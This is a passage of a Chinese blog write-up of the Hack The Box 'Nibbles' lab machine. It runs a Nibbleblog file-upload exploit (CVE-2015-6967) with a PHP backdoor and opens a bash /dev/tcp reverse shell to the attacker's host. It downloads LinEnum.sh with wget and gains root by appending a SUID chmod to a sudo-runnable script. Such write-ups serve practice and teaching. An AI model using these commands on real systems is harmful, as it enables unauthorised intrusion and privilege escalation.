+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>14、成功进入后台，那我们开始用一下呢个exp把</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/CVE-2015-6967-main]<br>└─$ python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload qsd-php-backdoor.php <br>[+] Login Successful.<br>[+] Upload likely successfull.<br>[+] Exploit launched, check <span class="hljs-keyword">for</span> shell.<br></code></pre></td></tr></table></figure>
+
+<p>15、在exp的源码路径也放了上传的shell地址，我们直接利用上传的shell，构造个反弹shell把</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_shell</span>(<span class="hljs-params">session, nibbleURL</span>):<br>	exploitURL = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;nibbleURL&#125;</span>content/private/plugins/my_image/image.php&quot;</span><br>	exploitResp = session.get(exploitURL)<br><br>	<span class="hljs-keyword">if</span> exploitResp.status_code == <span class="hljs-number">200</span>:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Exploit launched, check for shell.&#x27;</span>)<br>	<span class="hljs-keyword">else</span>:<br>		<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Exploit failed.&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>16、至此，我们成功的获取到了一个user.txt</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br><br>http://10.10.10.75/nibbleblog//content/private/plugins/my_image/image.php<br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/10.10.14.7/10086 0&gt;&amp;1&quot;</span><br><br>┌──(kali㉿kali)-[~]<br>└─$ nc -lvnp 10086<br>listening on [any] 10086 ...<br>connect to [10.10.14.7] from (UNKNOWN) [10.10.10.75] 54960<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1354): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ <br><br>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ <span class="hljs-built_in">cd</span> ~<br>&lt;ml/nibbleblog/content/private/plugins/my_image$ <span class="hljs-built_in">cd</span>~                         <br>nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>personal.zip<br>user.txt<br>nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">cat</span> user.txt<br><span class="hljs-built_in">cat</span> user.txt<br>d92d4dcd89654ab9fd78eadbbcda01c5<br>nibbler@Nibbles:/home/nibbler$<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>17、在上面的步骤中我们发现首页根目录放着一个压缩包，搞下来看看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">md5sum</span> personal.zip<br><span class="hljs-built_in">md5sum</span> personal.zip<br>dbc3f2c0351447fade589289d60335ae  personal.zip<br>nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">cat</span> personal.zip | <span class="hljs-built_in">base64</span> -w 0;<span class="hljs-built_in">echo</span><br><span class="hljs-built_in">cat</span> personal.zip | <span class="hljs-built_in">base64</span> -w 0;<span class="hljs-built_in">echo</span><br>UEsDBAoAAAA******************wEAACYGAAAAAA==<br>nibbler@Nibbles:/home/nibbler$<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ &gt;....                                                   <br>e27432 ********* GAAAAAA== | <span class="hljs-built_in">base64</span> -d &gt; personal.zip<br><br>┌──(kali㉿kali)-[~/桌面]<br>└─$ <span class="hljs-built_in">md5sum</span> personal.zip <br>dbc3f2c0351447fade589289d60335ae  personal.zip<br></code></pre></td></tr></table></figure>
+
+<p>18、这个方法还是我在HTB的其他靶机上学到的，一般读取一些小文件，如 id_rsa 文件，解压缩，看看这个文件里是什么东西吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Tecmint_monitor.sh <br>Written <span class="hljs-keyword">for</span> Tecmint.com <span class="hljs-keyword">for</span> the post www.tecmint.com/linux-server-health-monitoring-script<br></code></pre></td></tr></table></figure>
+
+<p>19、整体看了下是一个监控的小脚本工具。</p>
+<p>20、由于我没有通过ssh登录的这个账号，我也不知道该账号的密码，如果直接sudo -l 的话，会让我输入密码，这里我直接使用LinEnum.sh工具进行全部信息枚举下吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/test]<br>└─$ python3 -m http.server 8000<br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...<br><br><br>nibbler@Nibbles:/tmp$ wget http://10.10.14.7:8000/LinEnum.sh<br>wget http://10.10.14.7:8000/LinEnum.sh<br>--2023-12-04 04:12:05--  http://10.10.14.7:8000/LinEnum.sh<br>Connecting to 10.10.14.7:8000... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 46631 (46K) [text/x-sh]<br>Saving to: <span class="hljs-string">&#x27;LinEnum.sh&#x27;</span><br><br>LinEnum.sh            0%[                    ]       0  --.-KB/s             LinEnum.sh           43%[=======&gt;            ]  19.67K  60.3KB/s             LinEnum.sh           91%[=================&gt;  ]  41.50K  68.0KB/s             LinEnum.sh          100%[===================&gt;]  45.54K  74.6KB/s    <span class="hljs-keyword">in</span> 0.6s    <br><br>2023-12-04 04:12:06 (74.6 KB/s) - <span class="hljs-string">&#x27;LinEnum.sh&#x27;</span> saved [46631/46631]<br><br>nibbler@Nibbles:/tmp$<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/Nibbles-htb-writeup/7.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>/home/nibbler/personal/stuff/monitor.sh</code></p>
+<p>22、在这里其实已经知道该杂提权了，结合前面的呢个压缩包和路劲，妥妥的解压再运行啊（实际打靶环节中，我癔症了会，没有立马的想到，毕竟这也太直接了吧）！</p>
+<p>23、方法知道了，那就开始提权吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>personal.zip  user.txt<br>nibbler@Nibbles:/home/nibbler$ unzip personal.zip<br>unzip personal.zip<br>Archive:  personal.zip<br>   creating: personal/<br>   creating: personal/stuff/<br>  inflating: personal/stuff/monitor.sh  <br>nibbler@Nibbles:/home/nibbler$<br>nibbler@Nibbles:/home/nibbler$ <span class="hljs-built_in">cd</span> /personal/stuff<br><span class="hljs-built_in">cd</span> /personal/stuff<br>nibbler@Nibbles:/home/nibbler/personal/stuff$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span> &gt;&gt; monitor.sh<br>&lt;er/personal/stuff$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod u+s /bin/bash&quot;</span> &gt;&gt; mnitor.sh<br>nibbler@Nibbles:/home/nibbler/personal/stuff$ <span class="hljs-built_in">cat</span> monitor.sh<br><span class="hljs-built_in">cat</span> monitor.sh<br>...........................<br><span class="hljs-comment"># Remove Temporary Files</span><br><span class="hljs-built_in">rm</span> /tmp/osrelease /tmp/who /tmp/ramcache /tmp/diskusage<br>&#125;<br><span class="hljs-keyword">fi</span><br><span class="hljs-built_in">shift</span> $((<span class="hljs-variable">$OPTIND</span> -<span class="hljs-number">1</span>))<br><span class="hljs-built_in">chmod</span> u+s /bin/bash<br>nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh<br>sudo ./monitor.sh<br><span class="hljs-string">&#x27;unknown&#x27;</span>: I need something more specific.<br>/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found<br>/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found<br>/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found<br>nibbler@Nibbles:/home/nibbler/personal/stuff$ <span class="hljs-built_in">ls</span> -la /bin/bash<br><span class="hljs-built_in">ls</span> -la /bin/bash<br>-rwsr-xr-x 1 root root 1037528 May 16  2017 /bin/bash<br>nibbler@Nibbles:/home/nibbler/personal/stuff$ /bin/bash -p<br>/bin/bash -p<br>bash-4.3<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=1001(nibbler) gid=1001(nibbler) euid=0(root) <span class="hljs-built_in">groups</span>=1001(nibbler)<br>bash-4.3<span class="hljs-comment"># ca /root/root.txt</span><br>ca /root/root.txt<br>bash: ca: <span class="hljs-built_in">command</span> not found<br>bash-4.3<span class="hljs-comment"># cat /root/root.txt</span><br><span class="hljs-built_in">cat</span> /root/root.txt<br>b19cb54ad99daab54d7efade799476f9<br>bash-4.3<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><a target="_blank" rel="noopener" href="https://www.hackthebox.com/achievement/machine/1705469/121">https://www.hackthebox.com/achievement/machine/1705469/121</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Nibbles-htb-writeup</div>
+      <div>https://sh1yan.top/2023/12/04/Nibbles-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年12月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/12/05/Sunday-htb-writeup/" title="Sunday-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Sunday-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/04/Valentine-htb-writeup/" title="Valentine-htb-writeup">
+                        <span class="hidden-mobile">Valentine-htb-writeup</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
